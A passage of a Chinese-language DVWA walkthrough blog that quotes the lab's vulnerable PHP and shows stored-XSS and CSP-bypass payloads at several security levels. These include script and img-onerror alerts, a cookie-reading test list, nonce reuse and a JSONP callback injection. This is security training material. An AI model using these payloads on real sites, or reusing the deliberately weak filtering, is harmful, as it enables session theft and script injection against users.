class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Vulnerability-Stored-XSS（存储型跨站脚本攻击）"><a href="#Vulnerability-Stored-XSS（存储型跨站脚本攻击）" class="headerlink" title="Vulnerability: Stored-XSS（存储型跨站脚本攻击）"></a>Vulnerability: Stored-XSS（存储型跨站脚本攻击）</h1><h2 id="Security-level-is-currently-low-9"><a href="#Security-level-is-currently-low-9" class="headerlink" title="Security level is currently: low."></a>Security level is currently: <em>low</em>.</h2><p>对输入并没有做XSS方面的过滤与检查，且存储在数据库中</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>点击 Sign 弹窗成功！这个已经存储在数据库中了，每次刷新后都会弹出框，可重置数据库</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051178.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-medium-9"><a href="#Security-level-is-currently-medium-9" class="headerlink" title="Security level is currently: medium."></a>Security level is currently: <em>medium</em>.</h2><p>分析源码：</p>
<p>strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用<b>标签</b></p>
<p>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串</p>
<p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体：</p>
<p>这样的话我们不能通过 message 注入命令了，但是对name的处理，是我们可以入手的点。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>name 限制了长度 </p>
<p><img src="https://img-blog.csdnimg.cn/f2f9b2768c1b46bd96a808bf158f842d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_19,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>抓包修改txtName,发送数据包，弹窗成功！</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051823.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-high-9"><a href="#Security-level-is-currently-high-9" class="headerlink" title="Security level is currently: high."></a>Security level is currently: <em>high</em>.</h2><p>加了一层对name的过滤,使得<script> 不能使用了，那我们使用img</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051617.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>成功！</p>
<p>我们连接数据库可以看到我们注入的命令成功保存到了数据库 </p>
<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051635.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-impossible-9"><a href="#Security-level-is-currently-impossible-9" class="headerlink" title="Security level is currently: impossible."></a>Security level is currently: <em>impossible</em>.</h2><blockquote>
<p>通过使用htmlspecialchars函数，解决了XSS，所以无法注入。</p>
<p>通常有一些方式可以测试网站是否有正确处理特殊字符：</p>
<p>&gt;<script>alert(document.cookie)</script></p>
<p>=’&gt;<script>alert(document.cookie)</script></p>
<p>“&gt;<script>alert(document.cookie)</script></p>
<script>alert(document.cookie)</script>

<script>alert (vulnerable)</script>

<p>%3Cscript%3Ealert(‘XSS’)%3C/script%3E</p>
<script>alert('XSS')</script>

<img src="/2021/12/08/DVWA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/1NetworkSecurity\blog\eryao7\source\_posts\javascript:alert('XSS')">

<img src="http://xxx.com/yyy.png" onerror="alert('XSS')">

<div style="height:expression(alert('XSS'),1)"></div>（这个仅于IE7(含)之前有效） 

<h1 id="Vulnerability-CSP-Bypass（CSP绕过）"><a href="#Vulnerability-CSP-Bypass（CSP绕过）" class="headerlink" title="Vulnerability:CSP Bypass（CSP绕过）"></a>Vulnerability:CSP Bypass（CSP绕过）</h1><p>下面这篇文章为我们详细介绍了CSP</p>
<p><a href="https://blog.csdn.net/Cool_breeze_/article/details/108076748">HTTP CSP详解_码小余の博客-CSDN博客</a></p>
<h2 id="Security-level-is-currently-low-10"><a href="#Security-level-is-currently-low-10" class="headerlink" title="Security level is currently: low."></a>Security level is currently: <em>low</em>.</h2><p>分析源码：</p>
<p>//script-src脚本：’self’只信任当前域名</p>
<p>信任 <a href="https://pastebin.xn--com-0da">https://pastebin.com </a> 我们尝试访问</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="comment">// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span></span><br><span class="line"></span><br><span class="line">header(<span class="variable">$headerCSP</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># These might work if you can&#x27;t create your own for some reason</span></span><br><span class="line"><span class="comment"># https://pastebin.com/raw/R570EE00</span></span><br><span class="line"><span class="comment"># https://hastebin.com/raw/ohulaquzex</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &lt;script src=&#x27;&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>可以在New Paste中写下代码，选择javaScript，点击create去创建链接</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051198.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>点击raw， 跳转显示 </p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051096.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051000.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们复制URL <a href="https://pastebin.com/raw/jSFXmFZf">https://pastebin.com/raw/jSFXmFZf</a> 提交，不明白我为什么不弹窗，挺离谱的~</p>
<p>方法就是这样，大家自己试一下吧~</p>
<h2 id="Security-level-is-currently-medium-10"><a href="#Security-level-is-currently-medium-10" class="headerlink" title="Security level is currently: medium."></a>Security level is currently: <em>medium</em>.</h2><p>分析源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="variable">$headerCSP</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Disable XSS protections so that inline alert boxes will work</span></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>输入<script>alert(1)</script> , 浏览器报错</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051419.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>结合源码的代码，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们输入 ，弹窗成功~</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script nonce=TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051941.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>指定nonce会使现代浏览器忽略’ unsafe-inline ‘</p>
<h2 id="Security-level-is-currently-high-10"><a href="#Security-level-is-currently-high-10" class="headerlink" title="Security level is currently: high."></a>Security level is currently: <em>high</em>.</h2><p>分析源码：</p>
<p>clickButton函数，点击按钮时会source/jsonp.php来加载一些代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="variable">$headerCSP</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line">vulnerabilities/csp/source/high.js</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clickButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = document.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.src = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">    document.body.appendChild(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solveSum</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> in obj) &#123;</span><br><span class="line">        document.getElementById(<span class="string">&quot;answer&quot;</span>).innerHTML = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = document.getElementById (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">    solve_button.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        clickButton();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们抓包修改 callback=alert(1) 发送数据包</p>
<p><img src="https://img-blog.csdnimg.cn/821ff3655d5d4f16ad9218ad0f0188b0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>执行弹窗代码成功。</p>
<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051715.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-impossible-10"><a href="#Security-level-is-currently-impossible-10" class="headerlink" title="Security level is currently: impossible."></a>Security level is currently: <em>impossible</em>.</h2><p>impossible等级执行JSONP调用，但不使用callback参数，而是硬编码要调用的函数。CSP设置只允许本地服务器上的外部javascript，不允许内联代码。</p>
<h1 id="Vulnerability-JavaScript（JS攻击）"><a href="#Vulnerability-JavaScript（JS攻击）" class="headerlink" title="Vulnerability:JavaScript（JS攻击）"></a>Vulnerability:JavaScript（JS攻击）</h1><p>通过捕获js中的漏洞进行，成功提交success就算赢</p>
<h2 id="Security-level-is-currently-low-11"><a href="#Security-level-is-currently-low-11" class="headerlink" title="Security level is currently: low."></a>Security level is currently: <em>low</em>.</h2><p>分析源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">MD5 code from here</span></span><br><span class="line"><span class="string">https://github.com/blueimp/JavaScript-MD5</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]&#125;function a(n)&#123;var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r&#125;function d(n)&#123;var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r&#125;function h(n)&#123;return a(i(d(n),8*n.length))&#125;function l(n,t)&#123;var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))&#125;function g(n)&#123;var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e&#125;function v(n)&#123;return unescape(encodeURIComponent(n))&#125;function m(n)&#123;return h(v(n))&#125;function p(n)&#123;return g(m(n))&#125;function s(n,t)&#123;return l(v(n),v(t))&#125;function C(n,t)&#123;return g(s(n,t))&#125;function A(n,t,r)&#123;return t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function()&#123;return A&#125;):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function rot13(inp) &#123;</span></span><br><span class="line"><span class="string">        return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function generate_token() &#123;</span></span><br><span class="line"><span class="string">        var phrase = document.getElementById(&quot;phrase&quot;).value;</span></span><br><span class="line"><span class="string">        document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    generate_token();</span></span><br><span 